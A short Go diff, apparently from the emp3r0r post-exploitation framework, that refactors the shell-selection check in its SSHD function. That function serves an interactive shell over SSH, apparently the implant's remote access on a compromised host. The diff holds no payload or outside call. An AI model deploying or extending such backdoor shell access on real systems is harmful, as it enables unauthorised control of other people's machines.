@@ -14,7 +14,6 @@ import (
 	"github.com/creack/pty"
 	"github.com/gliderlabs/ssh"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
-	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 func setWinsize(f *os.File, w, h int) {
@@ -34,7 +33,7 @@ func SSHD(shell, port string, args []string) (err error) {
 
 	ssh.Handle(func(s ssh.Session) {
 		cmd := exec.Command(exe, args...)
-		if shell == "bash" && util.IsFileExist(emp3r0r_data.DefaultShell) {
+		if shell == "bash" && emp3r0r_data.DefaultShell != "/bin/sh" {
 			cmd = exec.Command(emp3r0r_data.DefaultShell, "--rcfile", emp3r0r_data.UtilsPath+"/.bashrc")
 		}
 		cmd.Env = append(cmd.Env, os.Environ()...)
